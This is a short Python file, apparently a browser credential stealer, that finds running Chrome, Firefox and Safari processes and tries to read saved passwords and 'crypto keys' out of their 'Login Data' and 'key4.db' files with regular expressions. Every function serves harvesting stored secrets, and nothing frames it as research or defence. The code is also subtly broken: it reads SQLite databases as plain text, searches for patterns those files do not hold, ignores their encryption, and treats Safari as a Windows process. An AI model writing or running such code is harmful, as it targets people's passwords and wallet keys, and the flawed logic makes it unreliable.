import re

from psutil import NoSuchProcess, Process, process_iter


def get_browsers() -> list[Process]:
    browsers = []
    for proc in process_iter(['pid', 'name']):
        if proc.info['name'] in ['chrome.exe', 'firefox.exe', 'safari.exe']:
            browsers.append(proc)
    return browsers


def extract_passwords(browser: Process) -> list[str] | None:
    try:
        chrome_path = Process(browser.pid).open_files()
        firefox_path = Process(browser.pid).open_files()
        safari_path = Process(browser.pid).open_files()

        for file in chrome_path:
            if 'Login Data' in str(file):
                password_file = file.path
                with open(password_file, 'r') as f:
                    data = f.read()
                    return re.findall(r'password":"([^"]*)', data)

        for file in firefox_path:
            if 'key4.db' in str(file):
                key4_db = file.path
                with open(key4_db, 'r') as f:
                    data = f.read()
                    return re.findall(r':([a-zA-Z0-9]*)', data)

        for file in safari_path:
            if 'Login Data' in str(file):
                password_file = file.path
                with open(password_file, 'r') as f:
                    data = f.read()
                    return re.findall(r'password":"([^"]*)', data)
    except NoSuchProcess:
        return None


def extract_crypto_keys(browser: Process) -> list[str] | None:
    try:
        chrome_path = Process(browser.pid).open_files()
        firefox_path = Process(browser.pid).open_files()
        safari_path = Process(browser.pid).open_files()

        for file in chrome_path:
            if 'Login Data' in str(file):
                password_file = file.path
                with open(password_file, 'r') as f:
                    data = f.read()
                    return re.findall(r'cryptoKey":"([a-zA-Z0-9]*)', data)

        for file in firefox_path:
            if 'key4.db' in str(file):
                key4_db = file.path
                with open(key4_db, 'r') as f:
                    data = f.read()
                    return re.findall(r':([a-zA-Z0-9]*)', data)

        for file in safari_path:
            if 'Login Data' in str(file):
                password_file = file.path
                with open(password_file, 'r') as f:
                    data = f.read()
                    return re.findall(r'cryptoKey":"([a-zA-Z0-9]*)', data)
    except NoSuchProcess:
        return None


def is_browser_supported(browser: Process) -> bool:
    if browser.info['name'] in ['chrome.exe', 'firefox.exe', 'safari.exe']:
        return True
    else:
        return False
